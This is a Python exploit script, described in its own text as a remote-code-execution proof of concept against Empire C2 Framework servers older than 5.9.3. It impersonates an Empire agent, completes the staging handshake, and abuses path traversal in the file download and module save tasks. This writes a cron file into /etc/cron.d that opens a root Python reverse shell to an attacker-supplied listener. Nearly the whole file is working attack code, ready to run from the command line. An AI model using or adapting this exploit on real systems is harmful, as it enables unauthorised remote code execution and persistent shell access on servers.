import os
import re
import random
import string
import struct
import requests
import base64
import threading
import argparse

import encryption
import compress


PYTHON = 2

NONE = 0
STAGE0 = 1
STAGE1 = 2
STAGE2 = 3
TASKING_REQUEST = 4
RESULT_POST = 5
SERVER_RESPONSE = 6


cron_payload = "* * * * * root /usr/bin/python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"IP\", PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n\n"

class Agent:
    def __init__(self,server,language,staging_key=None,session_id=None,taskURIs=None,hostname=":^)"):
        self.sk = staging_key
        self.server = server
        self.language = language
        self.taskURIs = taskURIs
        self.hostname = hostname
        if not taskURIs:
            self.taskURIs= ['/admin/get.php','/news.php','/login/process.php']
        self.session_id = session_id
        if not session_id:
            self.session_id = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))
        self.stage(True)

    def compress(self,data):
        c = compress.compress()
        start_crc32 = c.crc32_data(data)
        comp_data = c.comp_data(data)
        data = c.build_header(comp_data,start_crc32)
        return(base64.b64encode(data).decode("UTF-8"))

    def build_routing_packet(self, meta=0, enc_data=b'', additional=0):
        data = self.session_id + struct.pack("=BBHL", 2, meta, additional, len(enc_data))
        RC4IV = os.urandom(4)
        key = RC4IV + self.sk
        rc4EncData = encryption.rc4(key, data)
        packet = RC4IV + rc4EncData + enc_data
        return packet
    
    def build_response_packet(self, tasking_id, packet_data, result_id=0):
        
        packetType = struct.pack("=H", tasking_id)
        totalPacket = struct.pack("=H", 1)
        packetNum = struct.pack("=H", 1)
        result_id = struct.pack("=H", result_id)

        if packet_data:
            if isinstance(packet_data, str):
                packet_data = base64.b64encode(packet_data.encode("utf-8", "ignore"))
            else:
                packet_data = base64.b64encode(
                    packet_data.decode("utf-8").encode("utf-8", "ignore")
                )
            if len(packet_data) % 4:
                packet_data += "=" * (4 - len(packet_data) % 4)

            length = struct.pack("=L", len(packet_data))
            return packetType + totalPacket + packetNum + result_id + length + packet_data
        else:
            length = struct.pack("=L", 0)
            return packetType + totalPacket + packetNum + result_id + length

    def send_message(self, packets=None):
        headers = {}
        headers['Cookie'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'

        data = None
        if packets:
            enc_data = encryption.aes_encrypt_then_hmac(self.key, packets)
            data = self.build_routing_packet(meta=5, enc_data=enc_data)
        else:
            routingPacket = self.build_routing_packet(self.sk, self.session_id, meta=4)
            b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
            headers['Cookie'] = "session=%s" % (b64routingPacket)
        taskURI = random.sample(self.taskURIs, 1)[0]
        requestUri = self.server + taskURI

        r = requests.post(requestUri,data=data,headers=headers)
        return (r.status_code, r.content)


    def stage(self, stage0=False):
        #Recover staging key
        r = requests.get(self.server+'/download/python')
        self.sk = re.search('key=IV\+\'(.*)\'\.encode',r.text).group(1)
        print('Recovered staging key '+self.sk)
        #stage0 - This is not necessary. Leaving in 
        if stage0:
            session_id = b'00000000'
            rpacket = self.build_routing_packet(STAGE0)
            headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko','Cookie': "session="+base64.b64encode(rpacket).decode()}
            r = requests.get(self.server+random.sample(self.taskURIs, 1)[0],headers=headers)
            s_iv = r.content[0:4]
            data = r.content[4:]
            key = s_iv+self.sk
            stage0_resp = encryption.rc4(key,data)
            if r.status_code!=200:
                print("[!] stage0 failed")

        #r = requests.get(self.server+'/news.php',headers=headers)

        #stage1
        client_pub = encryption.DiffieHellman()
        public_key = str(client_pub.publicKey).encode('UTF-8')
        hmac_data = encryption.aes_encrypt_then_hmac(self.sk,public_key)

        rpacket = self.build_routing_packet(STAGE1,hmac_data)
        headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'}

        r = requests.post(self.server+random.sample(self.taskURIs, 1)[0],data=rpacket,headers=headers)
        if r.status_code!=200:
            print("[!] stage1 failed")
        packet = encryption.aes_decrypt_and_verify(self.sk,r.content)
        nonce, server_pub = packet[0:16], int(packet[16:])

        client_pub.genKey(server_pub)
        self.key = client_pub.key

        #stage2
        sysinfo = str(int(nonce)+1) + "|"+self.server+"||:^)|"+self.hostname+"|127.0.1.1|:^)|False|rekt.py|2603444|python|3.11|x86_64"
        hmac_data = encryption.aes_encrypt_then_hmac(self.key, sysinfo.encode("UTF-8"))

        rpacket = self.build_routing_packet(STAGE2,hmac_data)
        headers = {'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'}
        r = requests.post(self.server+random.sample(self.taskURIs, 1)[0],data=rpacket,headers=headers)
        if r.status_code!=200:
            print("[!] stage2 failed")
        agent_class = encryption.aes_decrypt_and_verify(self.key, r.content)

    def download(self,data,path):
        encodedPart = self.compress(data)
        packet = self.build_response_packet(41,"|".join(["0",path,str(len(data)),encodedPart]))
        status_code, resp = self.send_message(packet)
        #print(encryption.aes_decrypt_and_verify(sk,resp))

    def save_mod(self,data):
        file_name = ("A"*15+"/../a")
        data = self.compress(data.encode("UTF-8"))
        packet = self.build_response_packet(111,file_name+data)
        self.send_message(packet)


    def save_mod_wait(self,data):
        file_name = ("A"*15+"/../a")
        data = self.compress(data.encode("UTF-8"))
        packet = self.build_response_packet(101,file_name+data)
        self.send_message(packet)
        

description = '''
RCE PoC for Empire C2 Framework <5.9.3. Attacks a default HTTP listener.
'''

def cmdline_args():
    p = argparse.ArgumentParser(prog='rotj', description=description,
      formatter_class=argparse.RawDescriptionHelpFormatter)
  
    p.add_argument("target", type=str,
                   help="The target C2 server address.")
    p.add_argument("lhost", type=str,
                   help="Listener IP address.")
    p.add_argument("lport", type=int,
                   help="Listener port.")
    return(p.parse_args())



if __name__ == '__main__':
    args = cmdline_args()


    # TASK_DOWNLOAD 
    def task_download(write_path="\\etc\\cron.d\\evil"):
        agent = Agent(args.target, PYTHON)

        tr = "..\\"*50
        path = tr + write_path
        agent.download(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)).encode("UTF-8"),path)


    # TASK_CMD_WAIT_SAVE - Requires at least two responses within the same second. The first creates a directory 
    #  in cron.d which meets the save_path.exists() condition and allows us to write to the parent dir.
    def task_cmd_wait_save():
        agent = Agent(args.target, PYTHON, hostname="../"*50+"etc/cron.d/")
        threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()
        threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()
        threading.Thread(agent.save_mod_wait(cron_payload.replace("IP",args.lhost).replace("PORT",str(args.lport)))).start()

    task_download()
    #task_cmd_wait_save()
